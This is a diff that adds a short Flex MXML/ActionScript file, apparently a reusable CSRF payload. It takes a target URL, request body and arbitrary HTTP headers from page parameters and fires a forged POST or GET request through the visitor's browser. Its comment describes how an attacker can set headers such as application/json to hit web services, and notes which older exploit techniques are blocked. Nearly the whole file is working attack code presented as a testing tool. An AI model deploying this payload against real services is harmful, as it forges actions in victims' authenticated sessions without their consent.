@@ -1,0 +1,51 @@
+<?xml version="1.0"?>
+<!-- wrapper/SimplestNavigateToURL.mxml -->
+<mx:Application xmlns:mx="http://www.adobe.com/2006/mxml" creationComplete="CSRF()">
+	<mx:Script><![CDATA[
+		/* 
+		Written by Michael Brooks
+		
+		Example useage:
+		http://localhost/csrf_payload.html#url=http://google.com&content-type=application/json&body={%27test%27:1}
+		
+		Useful for testing CSRF against web services.
+		This allows the attacker to specify an arbitrary headers like the 
+		content-type: application/json
+		as well as an arbitrary body.
+		a content-type of "multipart/form-data" is forbidden
+		which means exploits like this: http://www.exploit-db.com/exploits/7383/ no longer work
+		Any http header can be set so long as its not a forbidden header:
+		http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/URLRequestHeader.html
+		*/
+		import flash.net.*;
+		import mx.core.FlexGlobals;
+		
+		private function CSRF():void{
+			var params:Object = FlexGlobals.topLevelApplication.parameters;
+			
+			//We have to have a url
+			var request:URLRequest = new URLRequest(unescape(params['url']));
+			delete params['url'];
+			
+			//The HTTP Body is optional
+			if("body" in params){
+				//Unfortunately PUT and DELETE are off limits
+				request.method = URLRequestMethod.POST;
+				//We can specify an arbitrary body
+				request.data = unescape(params['body']);
+				delete params['body']
+			}else{
+				request.method = URLRequestMethod.GET;
+			}
+			
+			//If there is any other variables set them as headers
+			for(var key:String in params){
+				request.requestHeaders.push(new URLRequestHeader(key, unescape(params[key]))); 
+			}
+			
+			//Fire!
+			navigateToURL(request, '_self');
+		}
+	]]></mx:Script>
+
+</mx:Application>
